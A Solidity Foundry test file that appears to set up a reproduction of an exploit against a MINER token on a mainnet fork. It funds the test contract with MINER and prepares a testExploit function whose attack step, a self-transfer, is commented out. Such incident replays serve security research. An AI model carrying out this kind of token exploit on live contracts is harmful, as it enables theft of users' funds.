// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IUniswapV3.sol";

import "./IMiner.sol";

IUniswapV3Pool constant WETH_MINER_Pool = IUniswapV3Pool(
    0x732276168b421D4792E743711E1A48172EA574a2
);
IMiner constant MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);
IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

contract MinerTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19226508 - 1);
        vm.label(address(MINER), "MINER");
        vm.label(address(WETH_MINER_Pool), "WETH_MINER_Pool");
        vm.label(address(WETH), "WETH");

        // init
        deal(address(MINER), address(this), 3.572592720467130237 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("MINER balance before", MINER.balanceOf(address(this)), 18);

        // MINER.transfer(address(this), 3 ether);

        // print("MINER balance after", MINER.balanceOf(address(this)), 18);
    }
}
